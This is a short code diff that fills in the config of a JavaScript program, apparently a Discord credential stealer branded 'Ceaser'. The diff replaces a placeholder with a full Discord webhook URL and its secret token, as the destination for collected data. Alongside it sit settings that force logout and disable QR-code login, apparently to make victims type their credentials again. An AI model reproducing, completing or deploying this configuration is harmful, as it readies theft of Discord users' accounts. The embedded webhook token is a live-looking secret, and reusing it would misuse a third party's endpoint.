@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "Ceaser ",
 
-    webhook: "REPLACE_ME",
+    webhook: "https://discord.com/api/webhooks/1177725340576137327/GFRDkilkswwUJZ4biLf1rk6KlGJieoyKsMTADogYeq66BjDCw1s3xOLw7GRU13QTYjpg",
 
     logout: true,
     disable_qr_code: true,
